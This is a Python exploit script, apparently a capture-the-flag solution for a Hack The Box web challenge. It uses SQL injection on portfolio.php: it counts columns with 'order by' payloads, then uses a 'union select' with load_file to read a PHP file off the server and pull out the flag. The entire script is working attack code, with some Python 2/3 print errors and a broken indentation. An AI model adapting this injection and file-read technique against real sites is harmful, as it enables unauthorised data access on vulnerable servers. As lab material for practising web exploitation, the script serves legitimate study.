import requests
from bs4 import BeautifulSoup
import sys
import re
if len(sys.argv)<2:
 print("Syntax : python %s <port>")%(str(sys.argv[0]))
else:
 print('-'*55)
 print("HTB WEB-CHALLENGE coded by ZyperX [Freelance]")
 print('-'*55)
 r=requests.session()
 port=str(sys.argv[1])
 url="http://docker.hackthebox.eu:"
 url=url+port
 uri="/portfolio.php?id=1"
 url=url+uri
 print("[*]SQLi Affected URI : %s")%(uri)
 print("[*]Counting Columns")
 for x in range(1,20):
   payload=(" order by %i --+")%(x)
   nurl=url+payload
   op=r.get(nurl)
   soup=BeautifulSoup(op.text,'html.parser')
   soup=soup.find('p')
   soup=str(soup)
   size=len(soup.split())
   print("[*]Page size at order by %s  : %s")%(x,size)
   if size < 36 :
     col= x-1
     break 
 print("-"*55)
 print("[*]Number of Columns : %d")%(col)
 print("[*]Web App Vulnerable with FILE PRIVILEGE SQLI")
 print("[*]Trying to read content of \'/var/www/html/administrat/panel.php\'")
 upayload=" union all select 1"
 for x in  range(2,col+1):
  x=str(x)
  upayload=upayload+","+x
upayload=upayload+" --+"
url=url+upayload
print("[*]Executing.  : %s")%(url)
op=r.get(url)
op=str(op.text)
if op.find("2"):
 print("[*]Column 2 is reflected");
 print("[*]Injecting payloads in column 2....");
upayload=upayload.replace('2','load_file(\'/var/www/html/administrat/panel.php\')')
url="http://docker.hackthebox.eu:"+port+uri+upayload
print("[*]Excecuting : %s")%(url)
op=r.get(url)
op=str(op.text)
op=re.search("HTB.*?<",op)
op=str(op.group())
op=op.replace('<','')
print("-"*55)
print("[*]Flag : %s")%(op)
